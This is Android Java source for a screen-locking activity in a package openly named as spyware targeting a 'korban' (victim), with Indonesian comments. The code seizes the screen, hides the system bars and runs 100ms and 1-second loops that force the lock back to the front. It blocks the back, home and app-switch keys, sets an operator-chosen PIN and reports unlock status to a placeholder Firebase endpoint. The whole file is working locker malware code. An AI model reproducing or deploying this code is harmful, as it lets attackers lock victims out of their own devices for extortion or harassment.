package com.spyware.korban;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LockActivity extends Activity {

    private static final String TAG = "LOCK_ACT";
    private static final long WATCHDOG_INTERVAL = 100;       // cek tiap 100ms
    private static final long HOME_REFORCE_INTERVAL = 1000;  // paksa lock tiap 1 detik
    private static final long REDIRECT_COOLDOWN = 150;
    private static final String CHANNEL_ID = "lock_channel";
    private static final int NOTIF_ID = 9911;

    private String password = "dimzz";
    private String lockedBy = "dimzz";
    private String info = "";
    private StringBuilder input = new StringBuilder();
    private volatile boolean unlocked = false;

    private TextView pinDisplay, errorMsg, lockedByText, infoText;
    private BroadcastReceiver closeReceiver;
    private Handler wd = new Handler(Looper.getMainLooper());
    private Runnable watchdog;
    private Runnable homeReforce;   // ← Runnable baru untuk reforce tiap 1 detik
    private long lastBringToFront = 0;

    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ═══ ANDROID 14: KEEP_SCREEN_ON tetap valid ═══
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        );

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);

        // ═══ ANDROID 14: Ganti FLAG_SHOW_WHEN_LOCKED + FLAG_TURN_SCREEN_ON ═══
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        } else {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        }

        // Android 14: FLAG_DISMISS_KEYGUARD deprecated - dihapus

        getWindow().setNavigationBarColor(0xFF000000);
        getWindow().setStatusBarColor(0xFF000000);

        hideSystemUI();

        Intent intent = getIntent();
        if (intent != null) {
            String p = intent.getStringExtra("lock_password");
            if (p != null && !p.isEmpty()) password = p;
            String lb = intent.getStringExtra("lock_by");
            if (lb != null && !lb.isEmpty()) lockedBy = lb;
            String inf = intent.getStringExtra("lock_info");
            if (inf != null) info = inf;
        }

        setContentView(R.layout.activity_lock);

        deviceId = Build.MODEL.replace(" ", "_");

        pinDisplay = findViewById(R.id.pinDisplay);
        errorMsg = findViewById(R.id.errorMsg);
        lockedByText = findViewById(R.id.lockedByText);
        infoText = findViewById(R.id.infoText);

        lockedByText.setText("SYSTEM LOCKED");
        if (info.isEmpty()) {
            infoText.setVisibility(View.GONE);
        } else {
            infoText.setText(info);
            infoText.setVisibility(View.VISIBLE);
        }

        int[] ids = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
                     R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
        for (int i = 0; i < ids.length; i++) {
            final String num = String.valueOf(i);
            Button b = findViewById(ids[i]);
            if (b != null) {
                b.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        press(num);
                    }
                });
            }
        }

        View delBtn = findViewById(R.id.btnDel);
        if (delBtn != null) {
            delBtn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) { del(); }
            });
        }

        View okBtn = findViewById(R.id.btnOk);
        if (okBtn != null) {
            okBtn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) { doUnlock(); }
            });
        }

        updatePinDisplay();

        AccessibilityBlockService.blockActive = true;
        AccessibilityBlockService.lastLockPassword = password;
        AccessibilityBlockService.lastLockedBy = lockedBy;
        AccessibilityBlockService.lastLockInfo = info;

        // ═══ ANDROID 13+: RECEIVER_NOT_EXPORTED wajib ═══
        closeReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                unlocked = true;
                AccessibilityBlockService.blockActive = false;
                stopLockNotification();
                finish();
            }
        };
        IntentFilter filter = new IntentFilter("com.spyware.korban.CLOSE_LOCK");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(closeReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(closeReceiver, filter);
            }
        } catch (Exception e) {}

        // ═══ Foreground notification Android 14 ═══
        createLockNotificationChannel();
        startLockNotification();

        // ═══ WATCHDOG 100ms ═══
        watchdog = new Runnable() {
            @Override
            public void run() {
                if (unlocked) return;

                if (!isLockActivityTop()) {
                    restartLockActivity();
                }

                try {
                    ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                    if (am != null) am.moveTaskToFront(getTaskId(), 0);
                } catch (Exception e) {}

                AccessibilityBlockService.blockActive = true;
                hideSystemUI();

                wd.postDelayed(this, WATCHDOG_INTERVAL);
            }
        };
        wd.postDelayed(watchdog, WATCHDOG_INTERVAL);

        // ═══ HOME REFORCE - paksa lock tiap 1 detik ═══
        homeReforce = new Runnable() {
            @Override
            public void run() {
                if (unlocked) return;

                // Kalau LockActivity bukan di depan → paksa muncul
                if (!isLockActivityTop()) {
                    Log.d(TAG, "HOME REFORCE: LockActivity not on top, forcing...");
                    forceShowLock();
                }

                wd.postDelayed(this, HOME_REFORCE_INTERVAL);
            }
        };
        wd.postDelayed(homeReforce, HOME_REFORCE_INTERVAL);
    }

    // ═══════════════════════════════════════════════
    // NOTIFIKASI UNTUK ANDROID 14
    // ═══════════════════════════════════════════════
    private void createLockNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID,
                    "Lock Screen",
                    NotificationManager.IMPORTANCE_HIGH
                );
                ch.setDescription("Lock screen aktif");
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
        }
    }

    private void startLockNotification() {
        try {
            Intent notifIntent = new Intent(this, LockActivity.class);
            notifIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getActivity(this, 0, notifIntent, flags);

            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(this, CHANNEL_ID);
            } else {
                builder = new Notification.Builder(this);
            }
            builder.setContentTitle("🔒 SYSTEM LOCKED")
                   .setContentText("Device terkunci")
                   .setSmallIcon(android.R.drawable.ic_lock_lock)
                   .setContentIntent(pi)
                   .setOngoing(true)
                   .setPriority(Notification.PRIORITY_HIGH);

            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) {
                nm.notify(NOTIF_ID, builder.build());
            }
        } catch (Exception e) {
            Log.e(TAG, "notif: " + e.getMessage());
        }
    }

    private void stopLockNotification() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.cancel(NOTIF_ID);
        } catch (Exception e) {}
    }

    // ═══════════════════════════════════════════════
    // FORCE SHOW LOCK (dipakai oleh Home Reforce)
    // ═══════════════════════════════════════════════
    private void forceShowLock() {
        long now = System.currentTimeMillis();
        if (now - lastBringToFront < REDIRECT_COOLDOWN) return;
        lastBringToFront = now;

        try {
            Intent i = new Intent(this, LockActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_CLEAR_TOP
                | Intent.FLAG_ACTIVITY_SINGLE_TOP
                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            i.putExtra("lock_password", password);
            i.putExtra("lock_by", lockedBy);
            i.putExtra("lock_info", info);

            // ═══ ANDROID 14: PendingIntent untuk background start ═══
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        flags |= PendingIntent.FLAG_IMMUTABLE;
                    }
                    PendingIntent pi = PendingIntent.getActivity(this, 1, i, flags);
                    pi.send();
                } catch (Exception e) {
                    startActivity(i);
                }
            } else {
                startActivity(i);
            }
        } catch (Exception e) {
            Log.e(TAG, "forceShowLock: " + e.getMessage());
        }
    }

    private boolean isLockActivityTop() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am == null) return hasWindowFocus();

            java.util.List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
            if (tasks != null && !tasks.isEmpty()) {
                ActivityManager.RunningTaskInfo top = tasks.get(0);
                if (top.topActivity != null) {
                    return top.topActivity.getClassName()
                        .equals(LockActivity.class.getName());
                }
            }
        } catch (Exception e) {}
        return hasWindowFocus();
    }

    private void restartLockActivity() {
        forceShowLock();
    }

    private void press(String num) {
        if (unlocked) return;
        if (input.length() >= 12) return;
        input.append(num);
        updatePinDisplay();
        errorMsg.setVisibility(View.GONE);
        vibrateShort();
    }

    private void del() {
        if (unlocked) return;
        if (input.length() > 0) {
            input.deleteCharAt(input.length() - 1);
            updatePinDisplay();
        }
        vibrateShort();
    }

    private void updatePinDisplay() {
        int len = input.length();
        StringBuilder s = new StringBuilder();
        for (int i = 0; i < len; i++) s.append("●");
        int minLen = Math.max(4, len);
        for (int i = len; i < minLen; i++) s.append("_");
        pinDisplay.setText(s.toString());
    }

    private void vibrateShort() {
        try {
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(VibrationEffect.createOneShot(30, VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(30);
                }
            }
        } catch (Exception e) {}
    }

    private void doUnlock() {
        final String pw = input.toString();
        if (pw.equals(password)) {
            unlocked = true;
            AccessibilityBlockService.blockActive = false;
            stopLockNotification();

            new Thread(new Runnable() {
                @Override
                public void run() {
                    HttpURLConnection c = null;
                    DataOutputStream os = null;
                    try {
                        String url = "MASUKIN_FIREBASE_LU"
                            + deviceId + "/lock.json";
                        c = (HttpURLConnection) new URL(url).openConnection();
                        c.setRequestMethod("PUT");
                        c.setRequestProperty("Content-Type", "application/json");
                        c.setDoOutput(true);
                        c.setConnectTimeout(10000);
                        c.setReadTimeout(10000);
                        String body = "{\"locked\":false,\"unlocked_at\":" + System.currentTimeMillis() + "}";
                        os = new DataOutputStream(c.getOutputStream());
                        os.write(body.getBytes("UTF-8"));
                        os.flush();
                        c.getResponseCode();
                    } catch (Exception e) {
                    } finally {
                        try { if (os != null) os.close(); } catch (Exception e) {}
                        try { if (c != null) c.disconnect(); } catch (Exception e) {}
                    }
                }
            }).start();

            Toast.makeText(this, "🔓 Unlocked", Toast.LENGTH_SHORT).show();
            finish();
        } else {
            input.setLength(0);
            updatePinDisplay();
            errorMsg.setText("❌ ACCESS DENIED");
            errorMsg.setVisibility(View.VISIBLE);
            try {
                Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                if (v != null) {
                    long[] pattern = {0, 100, 50, 100};
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createWaveform(pattern, -1));
                    } else {
                        v.vibrate(pattern, -1);
                    }
                }
            } catch (Exception e) {}
        }
    }

    private void hideSystemUI() {
        View decorView = getWindow().getDecorView();

        // ═══ ANDROID 14: Pakai WindowInsetsController ═══
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                WindowInsetsController controller = decorView.getWindowInsetsController();
                if (controller != null) {
                    controller.hide(WindowInsets.Type.statusBars()
                                  | WindowInsets.Type.navigationBars());
                    controller.setSystemBarsBehavior(
                        WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
                }
            } catch (Exception e) {}
        } else {
            // Legacy untuk Android < 11
            decorView.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_LOW_PROFILE
            );
        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus && !unlocked) hideSystemUI();
        if (!hasFocus && !unlocked) {
            wd.postDelayed(new Runnable() {
                @Override public void run() { forceShowLock(); }
            }, 50);
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (unlocked) return super.onKeyDown(keyCode, event);

        if (keyCode >= KeyEvent.KEYCODE_0 && keyCode <= KeyEvent.KEYCODE_9) {
            press(String.valueOf(keyCode - KeyEvent.KEYCODE_0));
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_DEL) { del(); return true; }
        if (keyCode == KeyEvent.KEYCODE_ENTER
                || keyCode == KeyEvent.KEYCODE_NUMPAD_ENTER) {
            doUnlock();
            return true;
        }

        if (keyCode == KeyEvent.KEYCODE_BACK
                || keyCode == KeyEvent.KEYCODE_HOME
                || keyCode == KeyEvent.KEYCODE_MENU
                || keyCode == KeyEvent.KEYCODE_APP_SWITCH
                || keyCode == KeyEvent.KEYCODE_ESCAPE) {
            forceShowLock();
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_POWER) {
            return super.onKeyDown(keyCode, event);
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        if (unlocked) return super.onKeyUp(keyCode, event);
        if (keyCode == KeyEvent.KEYCODE_BACK
                || keyCode == KeyEvent.KEYCODE_HOME
                || keyCode == KeyEvent.KEYCODE_MENU
                || keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
            forceShowLock();
            return true;
        }
        return super.onKeyUp(keyCode, event);
    }

    @Override
    public boolean onKeyLongPress(int keyCode, KeyEvent event) {
        if (unlocked) return super.onKeyLongPress(keyCode, event);
        if (keyCode == KeyEvent.KEYCODE_HOME
                || keyCode == KeyEvent.KEYCODE_APP_SWITCH
                || keyCode == KeyEvent.KEYCODE_MENU
                || keyCode == KeyEvent.KEYCODE_BACK) {
            forceShowLock();
            return true;
        }
        return super.onKeyLongPress(keyCode, event);
    }

    @Override
    public void onBackPressed() {
        if (!unlocked) forceShowLock();
    }

    @Override
    protected void onUserLeaveHint() {
        super.onUserLeaveHint();
        if (unlocked) return;
        forceShowLock();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (unlocked) return;
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am != null) am.moveTaskToFront(getTaskId(), 0);
        } catch (Exception e) {}

        wd.postDelayed(new Runnable() {
            @Override public void run() {
                if (!unlocked && !isLockActivityTop()) forceShowLock();
            }
        }, 50);
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (unlocked) return;
        forceShowLock();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!unlocked) {
            AccessibilityBlockService.blockActive = true;
            hideSystemUI();
            startLockNotification();
        }
    }

    @Override
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (intent != null) {
            String p = intent.getStringExtra("lock_password");
            if (p != null && !p.isEmpty()) password = p;
            String lb = intent.getStringExtra("lock_by");
            if (lb != null && !lb.isEmpty()) lockedBy = lb;
            String inf = intent.getStringExtra("lock_info");
            if (inf != null) info = inf;
        }
        if (!unlocked) {
            AccessibilityBlockService.blockActive = true;
            AccessibilityBlockService.lastLockPassword = password;
            AccessibilityBlockService.lastLockedBy = lockedBy;
            AccessibilityBlockService.lastLockInfo = info;
            hideSystemUI();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unlocked = true;
        if (watchdog != null) wd.removeCallbacks(watchdog);
        if (homeReforce != null) wd.removeCallbacks(homeReforce);
        wd.removeCallbacksAndMessages(null);
        try {
            if (closeReceiver != null) unregisterReceiver(closeReceiver);
        } catch (Exception e) {}
        stopLockNotification();
    }
}